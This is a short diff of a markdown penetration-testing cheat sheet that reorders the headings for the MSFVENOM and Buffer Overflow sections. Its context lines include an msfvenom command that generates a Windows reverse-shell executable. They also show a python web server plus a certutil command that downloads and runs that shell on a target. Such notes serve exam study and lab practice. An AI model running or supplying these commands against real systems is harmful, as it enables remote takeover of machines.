@@ -31,13 +31,13 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you d
 python3 -m http.server 80
 && certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 && cmd /c C:\\Windows\\temp\\shell.exe
+## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />
+
 ````
-### MSFVENOM
+## MSFVENOM
 ````
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
 ````
-## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />
-
 ## File Transfer <img src="https://cdn-icons-png.flaticon.com/512/1037/1037316.png" width="40" height="40" />
 ### SMB
 ````
